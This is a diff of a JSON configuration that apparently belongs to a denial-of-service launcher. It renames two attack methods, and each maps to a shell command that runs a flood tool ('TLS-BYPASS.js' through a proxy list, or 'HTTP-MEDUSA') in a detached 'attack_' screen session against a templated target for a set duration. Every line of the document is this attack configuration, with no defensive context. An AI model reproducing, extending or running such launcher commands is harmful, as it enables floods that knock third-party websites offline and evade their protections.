@@ -1,4 +1,4 @@
 {
-    "HTTPGET": "screen -dmS attack_${attack_id} node TLS-BYPASS.js ${target} ${duration} 30 proxies.txt 30",
-    "HTTPPOST": "screen -dmS attack_${attack_id} ./HTTP-MEDUSA ${target} ${duration} 30 30"
+    "TLS-BYPASS": "screen -dmS attack_${attack_id} node TLS-BYPASS.js ${target} ${duration} 30 proxies.txt 30",
+    "HTTP-MEDUSA": "screen -dmS attack_${attack_id} ./HTTP-MEDUSA ${target} ${duration} 30 30"
 }
